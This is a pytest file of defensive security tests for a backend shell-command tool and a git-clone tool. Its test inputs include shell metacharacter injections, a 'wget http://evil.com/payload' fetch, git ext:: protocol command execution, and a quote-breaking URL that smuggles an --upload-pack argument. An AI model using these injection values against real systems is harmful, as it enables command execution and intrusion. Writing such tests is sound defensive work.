"""
Phase 1 — Kill the Shell: Adversarial Security Tests

Every test in this file is designed to FAIL on the current vulnerable code
(shell=True + blocklist defense) and PASS after the Phase 1 fix
(shell=False + executable allowlist + argv arrays).

Methodology: Test-first. Each test attacks the code with real injection payloads.
"""
import os
import sys
import tempfile
import time
from pathlib import Path
from unittest.mock import patch

import pytest

# ---------------------------------------------------------------------------
# 1. Shell metacharacter injection via execute_shell_command
# ---------------------------------------------------------------------------

class TestShellMetacharInjection:
    """
    With shell=True, metacharacters (;  |  &&  ``  $()  etc.) are
    interpreted by the shell.  After the fix (shell=False + allowlist),
    these must either be rejected outright or treated as literal strings
    that never reach a shell interpreter.
    """

    def test_semicolon_injection_rejected(self, tmp_path):
        """
        Attack: 'echo hello; echo INJECTED'
        Expected (current VULNERABLE code): both commands execute, INJECTED in stdout.
        Expected (FIXED code): only 'echo hello' runs, OR command is rejected.
        """
        from backend.tools.shell_tool import execute_shell_command

        marker_file = tmp_path / "pwned.txt"
        # Use a write-to-file payload so we can deterministically check
        cmd = f'echo safe & echo INJECTED > "{marker_file}"'
        result = execute_shell_command(
            command=cmd,
            cwd=str(tmp_path),
            timeout_seconds=5,
            workflow_id="test",
            step_name="test",
        )
        # After fix: marker file must NOT exist (injection must not execute)
        assert not marker_file.exists(), (
            "SECURITY FAILURE: Shell metacharacter injection succeeded — "
            f"'&' allowed second command to write to {marker_file}"
        )

    def test_backtick_expansion_rejected(self, tmp_path):
        """
        Attack: echo `whoami`
        With shell=True, backticks cause command substitution.
        After fix: backticks must be literal or rejected.
        """
        from backend.tools.shell_tool import execute_shell_command

        result = execute_shell_command(
            command="echo `echo BACKTICK_INJECTED`",
            cwd=str(tmp_path),
            timeout_seconds=5,
            workflow_id="test",
            step_name="test",
        )
        # After fix: stdout must NOT contain the expanded value
        assert "BACKTICK_INJECTED" not in result.stdout, (
            "SECURITY FAILURE: Backtick command substitution executed in shell"
        )

    def test_dollar_parens_expansion_rejected(self, tmp_path):
        """
        Attack: echo $(whoami)
        With shell=True, $() causes command substitution.
        After fix: must be literal or rejected.
        """
        from backend.tools.shell_tool import execute_shell_command

        result = execute_shell_command(
            command="echo $(echo DOLLAR_INJECTED)",
            cwd=str(tmp_path),
            timeout_seconds=5,
            workflow_id="test",
            step_name="test",
        )
        assert "DOLLAR_INJECTED" not in result.stdout, (
            "SECURITY FAILURE: $() command substitution executed in shell"
        )

    def test_pipe_injection_rejected(self, tmp_path):
        """
        Attack: echo safe | echo PIPED
        With shell=True, pipe connects two commands.
        After fix: pipe must be literal or rejected.
        """
        from backend.tools.shell_tool import execute_shell_command

        marker_file = tmp_path / "piped.txt"
        cmd = f'echo safe | echo PIPED > "{marker_file}"'
        result = execute_shell_command(
            command=cmd,
            cwd=str(tmp_path),
            timeout_seconds=5,
            workflow_id="test",
            step_name="test",
        )
        assert not marker_file.exists(), (
            "SECURITY FAILURE: Pipe injection executed second command"
        )

    def test_ampersand_background_injection(self, tmp_path):
        """
        Attack: echo safe && echo CHAINED
        With shell=True, && chains commands.
        After fix: must be literal or rejected.
        """
        from backend.tools.shell_tool import execute_shell_command

        marker_file = tmp_path / "chained.txt"
        cmd = f'echo safe && echo CHAINED > "{marker_file}"'
        result = execute_shell_command(
            command=cmd,
            cwd=str(tmp_path),
            timeout_seconds=5,
            workflow_id="test",
            step_name="test",
        )
        assert not marker_file.exists(), (
            "SECURITY FAILURE: && command chaining executed second command"
        )


# ---------------------------------------------------------------------------
# 2. Executable allowlist enforcement
# ---------------------------------------------------------------------------

class TestExecutableAllowlist:
    """
    After the fix, only executables in the allowlist should be permitted.
    Commands invoking unlisted executables must be rejected with exit_code 126.
    """

    def test_curl_not_in_allowlist(self, tmp_path):
        """curl is not in the allowlist — must be rejected."""
        from backend.tools.shell_tool import execute_shell_command

        result = execute_shell_command(
            command="curl http://example.com",
            cwd=str(tmp_path),
            timeout_seconds=5,
            workflow_id="test",
            step_name="test",
        )
        assert result.exit_code == 126, (
            f"SECURITY FAILURE: 'curl' should be rejected (exit 126), "
            f"got exit_code={result.exit_code}"
        )

    def test_wget_not_in_allowlist(self, tmp_path):
        """wget is not in the allowlist — must be rejected."""
        from backend.tools.shell_tool import execute_shell_command

        result = execute_shell_command(
            command="wget http://evil.com/payload",
            cwd=str(tmp_path),
            timeout_seconds=5,
            workflow_id="test",
            step_name="test",
        )
        assert result.exit_code == 126, (
            f"SECURITY FAILURE: 'wget' should be rejected (exit 126), "
            f"got exit_code={result.exit_code}"
        )

    def test_bash_not_in_allowlist(self, tmp_path):
        """Direct bash invocation must be rejected."""
        from backend.tools.shell_tool import execute_shell_command

        result = execute_shell_command(
            command="bash -c 'echo pwned'",
            cwd=str(tmp_path),
            timeout_seconds=5,
            workflow_id="test",
            step_name="test",
        )
        assert result.exit_code == 126, (
            f"SECURITY FAILURE: 'bash' should be rejected (exit 126), "
            f"got exit_code={result.exit_code}"
        )

    def test_sh_not_in_allowlist(self, tmp_path):
        """Direct sh invocation must be rejected."""
        from backend.tools.shell_tool import execute_shell_command

        result = execute_shell_command(
            command="sh -c 'echo pwned'",
            cwd=str(tmp_path),
            timeout_seconds=5,
            workflow_id="test",
            step_name="test",
        )
        assert result.exit_code == 126, (
            f"SECURITY FAILURE: 'sh' should be rejected (exit 126), "
            f"got exit_code={result.exit_code}"
        )

    def test_allowed_echo_succeeds(self, tmp_path):
        """echo IS in the allowlist — must succeed."""
        from backend.tools.shell_tool import execute_shell_command

        result = execute_shell_command(
            command="echo hello world",
            cwd=str(tmp_path),
            timeout_seconds=5,
            workflow_id="test",
            step_name="test",
        )
        assert result.exit_code == 0, (
            f"REGRESSION: 'echo' should be allowed, got exit_code={result.exit_code}"
        )
        assert "hello" in result.stdout

    def test_allowed_python_succeeds(self, tmp_path):
        """python IS in the allowlist — must succeed."""
        from backend.tools.shell_tool import execute_shell_command

        script = tmp_path / "script.py"
        script.write_text("print('allowed')\n")
        result = execute_shell_command(
            command=f'"{sys.executable}" script.py',
            cwd=str(tmp_path),
            timeout_seconds=5,
            workflow_id="test",
            step_name="test",
        )
        assert result.exit_code == 0, (
            f"REGRESSION: python should be allowed, got exit_code={result.exit_code}"
        )


# ---------------------------------------------------------------------------
# 3. Git clone security
# ---------------------------------------------------------------------------

class TestGitCloneSecurity:
    """
    Git clone must use argv (shell=False) with -- terminator.
    Must reject dangerous URL schemes and private IP resolution.
    """

    def test_ext_protocol_rejected(self, tmp_path):
        """
        Attack: ext::sh -c touch%20/tmp/pwned
        Git's ext:: transport executes arbitrary commands.
        Must be rejected.
        """
        from backend.tools.git_tool import clone_repository

        result = clone_repository(
            repo_url="ext::sh -c touch%20/tmp/pwned",
            target_dir=str(tmp_path / "repo"),
            workflow_id="test",
        )
        assert result.exit_code != 0, (
            "SECURITY FAILURE: ext:: protocol should be rejected"
        )
        assert "security" in (result.stderr or "").lower() or result.exit_code == 126, (
            "SECURITY FAILURE: ext:: protocol not explicitly blocked"
        )

    def test_file_protocol_rejected(self, tmp_path):
        """
        Attack: file:///etc/passwd
        Local filesystem access via git clone must be blocked.
        """
        from backend.tools.git_tool import clone_repository

        result = clone_repository(
            repo_url="file:///etc/passwd",
            target_dir=str(tmp_path / "repo"),
            workflow_id="test",
        )
        assert result.exit_code != 0, (
            "SECURITY FAILURE: file:// protocol should be rejected"
        )

    def test_local_path_rejected(self, tmp_path):
        """
        Attack: /etc or C:\\Windows
        Local paths must be rejected as git clone sources.
        """
        from backend.tools.git_tool import clone_repository

        result = clone_repository(
            repo_url="/etc",
            target_dir=str(tmp_path / "repo"),
            workflow_id="test",
        )
        assert result.exit_code != 0 and (
            result.exit_code == 126 or "security" in (result.stderr or "").lower()
            or "blocked" in (result.stderr or "").lower()
            or "rejected" in (result.stderr or "").lower()
        ), (
            "SECURITY FAILURE: Local path should be rejected for git clone"
        )

    def test_quote_breaking_url_rejected(self, tmp_path):
        """
        Attack: URL with embedded " to break out of quoting.
        'https://evil.com/repo" --upload-pack="touch /tmp/pwned'
        With shell=True + f-string quoting, the " breaks the command.
        With shell=False + --, this is harmless (literal URL, git fails cleanly).
        """
        from backend.tools.git_tool import clone_repository

        result = clone_repository(
            repo_url='https://evil.com/repo" --upload-pack="touch /tmp/pwned',
            target_dir=str(tmp_path / "repo"),
            workflow_id="test",
        )
        # Must not succeed and must not execute the upload-pack payload
        assert not (tmp_path / "repo" / "pwned").exists(), (
            "SECURITY FAILURE: Quote-breaking git URL executed upload-pack payload"
        )
        # The " character in URL should either be rejected or handled safely
        assert result.exit_code != 0, (
            "SECURITY FAILURE: Malicious URL with embedded quotes should fail"
        )

    def test_ssh_url_rejected_by_default(self, tmp_path):
        """
        git@ SSH URLs should be rejected by default (configurable).
        """
        from backend.tools.git_tool import clone_repository

        result = clone_repository(
            repo_url="git@evil.com:attacker/payload.git",
            target_dir=str(tmp_path / "repo"),
            workflow_id="test",
        )
        assert result.exit_code != 0, (
            "SECURITY FAILURE: git@ SSH URL should be rejected by default"
        )
        assert result.exit_code == 126 or "security" in (result.stderr or "").lower() or "blocked" in (result.stderr or "").lower(), (
            "SECURITY FAILURE: git@ SSH URL not explicitly security-blocked"
        )


# ---------------------------------------------------------------------------
# 4. Environment variable isolation
# ---------------------------------------------------------------------------

class TestEnvironmentIsolation:
    """
    The subprocess environment must use an ALLOWLIST, not a blocklist.
    Only explicitly allowed env vars should be passed.
    """

    def test_custom_secret_not_leaked(self, tmp_path):
        """
        A secret env var not matching the old prefix patterns
        (e.g., MY_CUSTOM_SECRET) must NOT leak to subprocess.
        """
        from backend.tools.shell_tool import execute_shell_command

        # Set a secret that doesn't match old SENSITIVE_ENV_PATTERNS prefixes
        with patch.dict(os.environ, {"MY_DATABASE_URL": "postgres://secret:pass@db/prod"}):
            result = execute_shell_command(
                command=f'"{sys.executable}" -c "import os; print(os.environ.get(\'MY_DATABASE_URL\', \'NOT_FOUND\'))"',
                cwd=str(tmp_path),
                timeout_seconds=5,
                workflow_id="test",
                step_name="test",
            )
            assert "postgres://secret" not in result.stdout, (
                "SECURITY FAILURE: MY_DATABASE_URL leaked to subprocess — "
                "env should use allowlist, not blocklist"
            )

    def test_path_is_preserved(self, tmp_path):
        """PATH must be in the allowlist (needed for finding executables)."""
        from backend.tools.shell_tool import execute_shell_command

        script = tmp_path / "check_path.py"
        script.write_text("import os; print('PATH=' + str(bool(os.environ.get('PATH'))))\n")
        result = execute_shell_command(
            command=f'"{sys.executable}" check_path.py',
            cwd=str(tmp_path),
            timeout_seconds=5,
            workflow_id="test",
            step_name="test",
        )
        assert "PATH=True" in result.stdout, (
            "REGRESSION: PATH should be preserved in subprocess environment"
        )

    def test_home_is_preserved(self, tmp_path):
        """HOME/USERPROFILE must be in the allowlist."""
        from backend.tools.shell_tool import execute_shell_command

        home_var = "USERPROFILE" if os.name == "nt" else "HOME"
        script = tmp_path / "check_home.py"
        script.write_text(f"import os; print('HOME=' + str(bool(os.environ.get('{home_var}'))))\n")
        result = execute_shell_command(
            command=f'"{sys.executable}" check_home.py',
            cwd=str(tmp_path),
            timeout_seconds=5,
            workflow_id="test",
            step_name="test",
        )
        assert "HOME=True" in result.stdout, (
            f"REGRESSION: {home_var} should be preserved in subprocess environment"
        )


# ---------------------------------------------------------------------------
# 5. Shell=False verification (meta-test)
# ---------------------------------------------------------------------------

class TestShellFalseEnforcement:
    """
    Verify that the fixed code actually uses shell=False by checking
    that shell metacharacters are treated as literals.
    """

    def test_echo_literal_dollar_sign(self, tmp_path):
        """
        'echo $HOME' with shell=False should print literal '$HOME',
        not the value of the HOME environment variable.
        """
        from backend.tools.shell_tool import execute_shell_command

        home_value = os.environ.get("HOME") or os.environ.get("USERPROFILE", "")
        result = execute_shell_command(
            command="echo $HOME",
            cwd=str(tmp_path),
            timeout_seconds=5,
            workflow_id="test",
            step_name="test",
        )
        if result.exit_code == 0:
            # With shell=False, stdout should NOT contain the actual home directory
            # It should either contain literal "$HOME" or be rejected
            if home_value and home_value in result.stdout:
                pytest.fail(
                    f"SECURITY FAILURE: 'echo $HOME' expanded to '{home_value}' — "
                    "shell=True is still active"
                )

    def test_echo_literal_semicolon(self, tmp_path):
        """
        'echo hello; echo world' with shell=False should print 'hello; echo world'
        as one argument to echo, not execute two separate commands.
        """
        from backend.tools.shell_tool import execute_shell_command

        result = execute_shell_command(
            command="echo hello; echo world",
            cwd=str(tmp_path),
            timeout_seconds=5,
            workflow_id="test",
            step_name="test",
        )
        if result.exit_code == 0:
            # With shell=True, both 'hello' and 'world' appear on separate lines
            # With shell=False, the entire '; echo world' is a literal argument
            lines = [l.strip() for l in result.stdout.strip().split("\n") if l.strip()]
            assert len(lines) <= 1 or ";" in result.stdout, (
                "SECURITY FAILURE: semicolon caused command splitting — shell=True is active"
            )
